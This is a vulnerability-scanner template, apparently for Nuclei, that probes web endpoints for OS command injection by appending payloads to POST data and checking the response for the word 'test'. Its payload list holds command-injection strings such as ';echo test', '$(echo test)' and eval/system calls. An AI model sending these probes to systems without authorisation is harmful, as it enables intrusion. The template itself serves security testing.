id: mr12-osInjectionPost
info:
  author: mr12
  description: Template to check foros InjectionGet vulnerabilities ; chage the post
    requests
  name: os InjectionGet Detection for Post
  severity: high
  tags:
  - osInjection
requests:
- matchers:
  - condition: or
    part: body
    type: word
    words:
    - test
  matchers-condition: or
  payloads:
    osPayloads:
    - ;echo test
    - ';echo test #'
    - '& echo test #'
    - ';echo test #'
    - '& echo test &'
    - '| echo test'
    - '# echo test'
    - '| echo test'
    - $(echo test)
    - '|| echo test'
    - '| echo test |'
    - '|| echo test ||'
    - ;echo test;
    - '` ehoc test `'
    - '%0a echo test %0a '
    - ;echo test|
    - ;|/usr/bin/echo test|
    - "\n/bin/echo test \n"
    - ;system('echo test')
    - ;system('echo test')
    - ;system('echo test')
    - eval('echo test')
    - eval('echo test');
    - response.write test
    - :response.write test
  raw:
  - 'POST {{endPoint}} HTTP/2

    Host: {{Hostname}}

    {{headers}}


    {{PosData}}{{osPayloads}}'
